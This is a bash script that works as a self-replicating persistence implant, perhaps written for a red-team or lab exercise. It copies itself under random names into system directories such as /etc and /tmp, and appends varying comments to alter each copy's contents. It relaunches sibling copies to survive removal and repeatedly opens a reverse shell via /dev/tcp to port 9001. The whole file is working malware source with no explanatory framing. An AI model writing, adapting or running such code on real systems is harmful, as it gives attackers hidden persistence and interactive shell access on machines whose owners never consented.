#!/bin/bash

dirs=("/etc" "/var" "/var/tmp" "/tmp")
names=("float.sh" "sink.sh" "burn.sh" "crash.sh")
append=("#AAAA" "#BBBB" "#CCCC" "#DDDD" "#EEEE" "#FFFF" "#aaaa" "#bbbb" "#cccc" "#dddd" "#eeee" "#ffff")
rappend=${append[RANDOM%12]}

replicate() {
	rdir=${dirs[RANDOM%4]}
	rando=${names[RANDOM%4]}
	cp ${0} "$rdir/$rando" 2>/dev/null
	echo "$rappend" >> "$rdir/$rando"
	bash "$rdir/$rando" &
	return
}

checker(){
	for dir in ${dirs[@]}; do # iterates through directory list
		for name in ${names[@]}; do # iterates through names array in each directory
			findo=$(find "$dir/" -iname "$name" 2>/dev/null) # looks for an existing replicant
			if [ ! -z "$findo" ]; then # if the name is there add 1 to counter
				imps+=("$findo")
			fi
		done
	done
}


while [ true ]; do
	imps=()
	checker

	if [ "${#imps[@]}" -le 1 ]; then # if there is one or no implants then replicate
		replicate
		exit 0
	elif [ "${#imps[@]}" -ge 3 ]; then # if there are already 2 implants then stop
		exit 0
	fi

	while [ "${#imps[@]}" -eq 2 ]; do # if there is already one other implant then flash a reverse shell, sleep 30, start the other implant and exit
		if ! bash -i >& /dev/tcp/localhost/9001 0>&1; then
			sleep 30
			for imp in ${imps[@]}; do #look for another implant to run
				if [ "$imp" != "${0}" ]; then
					alive=$(ls "$imp" 2>/dev/null)
					if [ ! -z "$alive" ]; then
						bash "$imp" & # try running the other implant
						exit 0
					elif [ -z "$alive" ]; then
						imps=()
					fi
				fi
			done
		fi
	done
done

